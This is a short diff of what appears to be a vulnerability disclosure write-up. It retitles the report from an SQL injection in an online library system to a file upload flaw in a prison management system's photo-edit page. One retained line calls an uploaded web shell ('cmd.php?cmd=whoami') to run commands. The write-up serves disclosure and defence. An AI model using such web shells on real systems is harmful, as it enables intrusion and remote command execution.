@@ -1,4 +1,4 @@
-Online Library System - SQL Injection on (admin/books/controller.php IBSN parameter) 
+Prison Management System - File upload on (/Admin/edit-photo.php) 
 
 Vendor Homepage:
 
@@ -99,6 +99,8 @@ Content-Disposition: form-data; name="btnsave"
 ```
 http://localhost:8888/uploadImage/cmd.php?cmd=whoami
 ```
+
+
 
 
 <img width="948" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/33c22ca2-0aa4-4136-a671-dd889083daf7">
